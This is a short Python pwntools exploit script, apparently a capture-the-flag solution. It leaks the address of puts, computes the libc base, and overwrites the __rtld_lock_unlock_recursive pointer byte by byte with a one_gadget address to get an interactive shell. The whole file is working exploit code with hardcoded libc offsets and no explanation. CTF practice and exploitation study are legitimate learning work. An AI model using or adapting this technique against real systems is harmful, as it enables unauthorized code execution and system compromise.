from parse_args_and_some_func import *
sh:tube = all_parsed_args["io"]

sh.recvuntil("I placed the target near: ")
msg = sh.recvline()

puts_addr = int16(msg[:-1].decode())
LOG_ADDR("puts_addr", puts_addr)
libc_base_addr = puts_addr - 0x809c0
LOG_ADDR("libc_base_addr", libc_base_addr)

one_gadget1 = libc_base_addr + 0x10a387

__rtld_lock_unlock_recursive_offset = 0x81df60
target_addr = libc_base_addr + __rtld_lock_unlock_recursive_offset

# one_gadget1 = libc_base_addr + 0xe569f
# _dl_catch_error_offset = 0x5f4038
# target_addr = libc_base_addr + _dl_catch_error_offset

# STOP()
sh.sendlineafter("shoot!shoot!\n", str(target_addr))

input_gadget = one_gadget1

for _ in range(3):
    sh.sendlineafter("biang!\n", chr(input_gadget & 0xff))
    input_gadget = input_gadget >> 8


sh.interactive()